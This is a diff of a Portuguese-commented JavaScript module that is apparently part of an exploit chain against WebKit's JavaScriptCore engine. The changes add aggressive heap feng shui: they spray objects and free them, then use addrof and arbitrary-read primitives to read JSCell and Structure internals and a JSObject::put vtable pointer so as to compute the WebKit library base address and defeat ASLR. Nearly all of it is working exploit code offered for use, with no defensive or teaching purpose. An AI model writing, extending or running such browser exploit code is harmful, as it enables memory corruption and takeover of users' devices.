@@ -1,13 +1,12 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v104 - R64 com Leituras Estendidas e Diagnóstico Aprofundado)
+// js/script3/testArrayBufferVictimCrash.mjs (v105 - R65 com Heap Feng Shui Agressivo)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
 // Adicionada estabilização de heap via "object spray" para mitigar o Garbage Collector.
 // Implementada uma verificação funcional de escrita e leitura para confirmar que as
 // primitivas de L/E estão funcionando corretamente, eliminando falsos positivos.
 //
-// NOVO: Tentativa explícita de vazar o endereço base do WebKit com logs verbosos,
-// usando um *objeto dedicado e isolado* para o vazamento de estruturas internas,
-// e verificação de valores lidos para diagnosticar falhas nos offsets.
+// NOVO: Heap Feng Shui agressivo antes da tentativa de vazamento do WebKit para
+// tentar forçar o alocador a usar regiões de memória "limpas" para o objeto de vazamento.
 //
 // ATENÇÃO: PREMISSA DE QUE TODOS OS OFFSETS EM config.mjs SÃO VÁLIDOS,
 // E PROPERTY_STORAGE_CAPACITY_OFFSET: 0x18 FOI REMOVIDO!
@@ -22,7 +21,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs'; // Importar WEBKIT_LIBRARY_INFO
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v104_R64_DeepLeakDiag";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v105_R65_AggroFengShui";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -46,16 +45,16 @@ function doubleToInt64(double) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Diagnóstico de Vazamento Isolado (Offsets Validados) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Diagnóstico de Vazamento Isolado (Offsets Validados, Heap Feng Shui) ---`, "test");
 
     let final_result = {
         success: false,
         message: "A verificação funcional de L/E falhou ou vazamento WebKit falhou.",
-        webkit_leak_details: { success: false, msg: "Vazamento WebKit não tentado ou ou falhou." }
+        webkit_leak_details: { success: false, msg: "Vazamento WebKit não tentado ou falhou." }
     };
 
     try {
-        // --- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj ---
+        // --- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---
         logS3("--- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
         if (!getOOBDataView()) {
@@ -169,48 +168,72 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             throw new Error(`A verificação de L/E falhou. Escrito: ${value_to_write_for_verification.toString(true)}, Lido: ${value_read_for_verification.toString(true)}`);
         }
 
-        // --- FASE 5: TENTATIVA DE VAZAMENTO DO ENDEREÇO BASE DO WEBKIT ---
+        // --- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT ---
         logS3("--- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT ---", "subtest");
         let webkit_base_candidate = AdvancedInt64.Zero;
         
         try {
-            // **Estratégia Aprimorada: Usar um objeto NOVO e ISOLADO para o vazamento de estruturas.**
-            const obj_for_webkit_leak = {}; // Crie um objeto simples e novo.
+            // ** Heap Feng Shui Agressivo **
+            logS3("  Executando Heap Feng Shui agressivo para tentar limpar o heap...", "info");
+            let aggressive_feng_shui_objects = [];
+            for (let i = 0; i < 10000; i++) { // Aumente o número para 10.000 ou mais
+                // Variar os tamanhos dos objetos para fragmentar o heap de forma mais eficaz
+                aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10)); // Arrays de 10 a 509 elementos
+                aggressive_feng_shui_objects.push({});
+                aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 200) + 50))); // Strings de 50 a 249 caracteres
+                aggressive_feng_shui_objects.push(new Date()); // Outros tipos de objetos
+            }
+            // Forçar uma coleta de lixo, se possível, liberando as referências
+            for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) { // Liberar metade para fragmentar
+                aggressive_feng_shui_objects[i] = null;
+            }
+            // Tentar disparar o GC. Note que 'gc()' não é padrão e só funciona com flags de depuração.
+            // Para forçar, a melhor estratégia é alocar muito e liberar.
+            // A atribuição para null e a redução do array podem ajudar.
+            aggressive_feng_shui_objects.length = 0; // Remove todas as referências restantes
+            aggressive_feng_shui_objects = null; // Libera o array em si
+
+            await PAUSE_S3(2000); // Pausa ainda maior (2 segundos) para dar tempo ao GC
+            logS3(`  Heap Feng Shui concluído. Pausa (2000ms) finalizada. Tentando alocar objeto para vazamento...`, "debug");
+
+            // **Crie o objeto de vazamento APÓS o feng shui**
+            const obj_for_webkit_leak = {}; 
             const obj_for_webkit_leak_addr = addrof(obj_for_webkit_leak);
-            logS3(`  Endereço do objeto dedicado para vazamento WebKit: ${obj_for_webkit_leak_addr.toString(true)}`, "info");
+            logS3(`  Endereço do objeto dedicado para vazamento WebKit (Pós-Feng Shui): ${obj_for_webkit_leak_addr.toString(true)}`, "info");
 
             if (obj_for_webkit_leak_addr.low() === 0 && obj_for_webkit_leak_addr.high() === 0) {
-                throw new Error("Addrof retornou 0 para objeto de vazamento WebKit.");
+                throw new Error("Addrof retornou 0 para objeto de vazamento WebKit (pós-Feng Shui).");
+            }
+            if (obj_for_webkit_leak_addr.high() === 0x7ff80000 && obj_for_webkit_leak_addr.low() === 0) {
+                throw new Error("Addrof para objeto de vazamento WebKit é NaN (pós-Feng Shui).");
             }
 
-            // PAUSA MAIOR PARA MITIGAR PROBLEMAS DE TIMING/GC ANTES DE LEITURAS CRÍTICAS
-            await PAUSE_S3(1000); // 1 segundo de pausa
-            logS3(`  Pausa (1000ms) para estabilização de GC/Heap antes do vazamento de WebKit...`, "debug");
-
+            await PAUSE_S3(100); // Pequena pausa antes de ler
+            
             // 1. LEITURAS DA JSCell (do obj_for_webkit_leak)
-            logS3(`  Iniciando leituras da JSCell do objeto de vazamento...`, "debug");
+            logS3(`  Iniciando leituras da JSCell do objeto de vazamento (Pós-Feng Shui)...`, "debug");
             const jscell_structure_ptr_addr = obj_for_webkit_leak_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
             const structure_addr = arb_read_final(jscell_structure_ptr_addr);
             logS3(`    Lido Structure* (${JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET}): ${structure_addr.toString(true)} de ${jscell_structure_ptr_addr.toString(true)}`, "leak");
             if (!isAdvancedInt64Object(structure_addr) || structure_addr.low() === 0 && structure_addr.high() === 0) throw new Error("Falha ao vazar Structure* (endereço é 0x0).");
-            if (structure_addr.high() === 0x7ff80000 && structure_addr.low() === 0) throw new Error("Falha ao vazar Structure* (valor é NaN).");
+            if (structure_addr.high() === 0x7ff80000 && structure_addr.low() === 0) throw new Error("Falha ao vazar Structure* (valor é NaN - provável confusão de tipo ou dados inválidos).");
             if (structure_addr.high() < 0x40000000) logS3(`    ALERTA: Structure* (${structure_addr.toString(true)}) parece um endereço baixo (Smi?), o que é incomum para um ponteiro de estrutura real.`, "warn");
 
-            const jscell_structure_id_flattened_addr = obj_for_webkit_leak_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET);
-            const structure_id = arb_read_final(jscell_structure_id_flattened_addr); // Lendo 8 bytes, mas é só 1 byte. CUIDADO.
-            // Para ler 1 byte, precisamos de uma primitiva arb_read_byte ou ajustar arb_read_final para byteLength=1.
-            // Por simplicidade, vou ler 4 bytes e pegar o LSB, mas idealmente seria uma leitura de 1 byte.
-            const structure_id_byte = arb_read_final(jscell_structure_id_flattened_addr).low() & 0xFF; // Apenas o byte mais baixo
-            logS3(`    Lido StructureID_Flattened (${JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET}): ${toHex(structure_id_byte, 8)} de ${jscell_structure_id_flattened_addr.toString(true)}`, "leak");
-            // Adicionar verificação para StructureID (e.g., JSObject_Simple_STRUCTURE_ID, se conhecido)
+            // Leitura de bytes específicos - Ajustado para usar arb_read_final e pegar o byte correto
+            // NOTA: arb_read_final lê 8 bytes. Para 1 byte, lemos 8 e isolamos o byte desejado.
+            // Certifique-se de que JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET e
+            // CELL_TYPEINFO_TYPE_FLATTENED_OFFSET são realmente offsets de 1 byte.
+            const structure_id_flattened_val = arb_read_final(obj_for_webkit_leak_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET));
+            const structure_id_byte = structure_id_flattened_val.low() & 0xFF; // Assume que o byte está no low.low()
+            logS3(`    Lido StructureID_Flattened (${JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET}): ${toHex(structure_id_byte, 8)} de ${obj_for_webkit_leak_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET).toString(true)} (Valor Full: ${structure_id_flattened_val.toString(true)})`, "leak");
             if (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSObject_Simple_STRUCTURE_ID !== null &&
                 structure_id_byte !== JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSObject_Simple_STRUCTURE_ID) {
                 logS3(`    ALERTA: StructureID (${toHex(structure_id_byte, 8)}) não corresponde ao esperado JSObject_Simple_STRUCTURE_ID (${toHex(JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSObject_Simple_STRUCTURE_ID, 8)}).`, "warn");
             }
 
-            const jscell_typeinfo_type_flattened_addr = obj_for_webkit_leak_addr.add(JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET);
-            const typeinfo_type_byte = arb_read_final(jscell_typeinfo_type_flattened_addr).low() & 0xFF; // Apenas o byte mais baixo
-            logS3(`    Lido CELL_TYPEINFO_TYPE_FLATTENED (${JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET}): ${toHex(typeinfo_type_byte, 8)} de ${jscell_typeinfo_type_flattened_addr.toString(true)}`, "leak");
+            const typeinfo_type_flattened_val = arb_read_final(obj_for_webkit_leak_addr.add(JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET));
+            const typeinfo_type_byte = typeinfo_type_flattened_val.low() & 0xFF;
+            logS3(`    Lido CELL_TYPEINFO_TYPE_FLATTENED (${JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET}): ${toHex(typeinfo_type_byte, 8)} de ${obj_for_webkit_leak_addr.add(JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET).toString(true)} (Valor Full: ${typeinfo_type_flattened_val.toString(true)})`, "leak");
 
             // 2. LEITURAS DA STRUCTURE
             logS3(`  Iniciando leituras da Structure...`, "debug");
@@ -233,6 +256,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             logS3(`    Lido Prototype* (${JSC_OFFSETS.Structure.PROTOTYPE_OFFSET}): ${prototype_addr.toString(true)} de ${prototype_ptr_addr.toString(true)}`, "leak");
             if (prototype_addr.low() === 0 && prototype_addr.high() === 0) logS3(`    AVISO: Prototype* é 0x0.`, "warn");
 
+            const aggregated_flags_addr = structure_addr.add(JSC_OFFSETS.Structure.AGGREGATED_FLAGS_OFFSET);
+            const aggregated_flags_val = arb_read_final(aggregated_flags_addr);
+            logS3(`    Lido AGGREGATED_FLAGS (${JSC_OFFSETS.Structure.AGGREGATED_FLAGS_OFFSET}): ${aggregated_flags_val.toString(true)} de ${aggregated_flags_addr.toString(true)}`, "leak");
+
             await PAUSE_S3(50); // Pequena pausa
 
             // 3. Leitura do ponteiro JSC::JSObject::put da vtable da Structure
@@ -250,6 +277,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             if ((js_object_put_func_addr.low() & 1) === 0 && js_object_put_func_addr.high() === 0) { // Baixo, par, high 0 => possível Smi
                 logS3(`    ALERTA: Ponteiro para JSC::JSObject::put (${js_object_put_func_addr.toString(true)}) parece ser um Smi ou endereço muito baixo, o que é incomum para um ponteiro de função.`, "warn");
             }
+
 
             // 4. Calcular WebKit Base
             const expected_put_offset_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"];
